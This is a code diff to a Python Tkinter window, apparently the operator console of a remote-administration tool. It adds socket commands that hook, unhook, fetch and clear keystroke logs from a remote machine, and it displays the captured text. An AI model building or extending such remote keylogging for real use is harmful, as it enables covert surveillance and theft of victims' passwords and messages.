@@ -4,9 +4,9 @@ import ui.label as lb
 import queue
 
 class UI_keylogger(tk.Toplevel):
-    def __init__(self, parent):
+    def __init__(self, parent, socket_queue):
         self.ui_queue = queue.Queue()
-        self.socket_queue = None
+        self.socket_queue = socket_queue
 
         super().__init__(parent)
         self.title = lb.KEYLOGGER_TITLE
@@ -33,11 +33,19 @@ class UI_keylogger(tk.Toplevel):
 
     def hook(self):
         if self.btn_hook_stt.get() == lb.KEYLOGGER_HOOK:
-            self.btn_hook_stt.set(lb.KEYLOGGER_UNHOOK)
-        else:
-            self.btn_hook_stt.set(lb.KEYLOGGER_HOOK)
+            self.socket_cmd("listener-hook")
+        elif self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
+            self.socket_cmd("listener-unhook")
+
+        self.btn_hook_stt.set(lb.WAIT)
+
     def clear(self):
-        return
+        self.socket_cmd("listener-clear")
+
+        self.text_log.config(state = 'normal')
+        self.text_log.delete(1.0, tk.END)
+        self.text_log.config(state = 'disabled')
+
     def block(self):
         if self.btn_block_stt.get() == lb.KEYLOGGER_BLOCK:
             self.btn_block_stt.set(lb.KEYLOGGER_UNBLOCK)
@@ -48,7 +56,20 @@ class UI_keylogger(tk.Toplevel):
         DEBUG("task", task)
         cmd, ext = task
 
+        if cmd == "update-log":
+            self.text_log.config(state = 'normal')
+            self.text_log.delete(1.0, tk.END)
+            self.text_log.insert(tk.END, ext)
+            self.text_log.config(state = 'disabled')
+        elif cmd == "hook":
+            self.btn_hook_stt.set(lb.KEYLOGGER_HOOK)
+        elif cmd == "unhook":
+            self.btn_hook_stt.set(lb.KEYLOGGER_UNHOOK)
+
     def periodic_call(self):
+        if self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
+            self.socket_cmd("listener-get")
+
         while True:
             try:
                 task = self.ui_queue.get_nowait()
@@ -58,9 +79,6 @@ class UI_keylogger(tk.Toplevel):
                 break
         
         self.after(200, self.periodic_call)
-
-    def add_socket_queue(self, socket_queue):
-        self.socket_queue = socket_queue
     
     def socket_cmd(self, cmd, ext = None):
         self.socket_queue.put((cmd, ext))
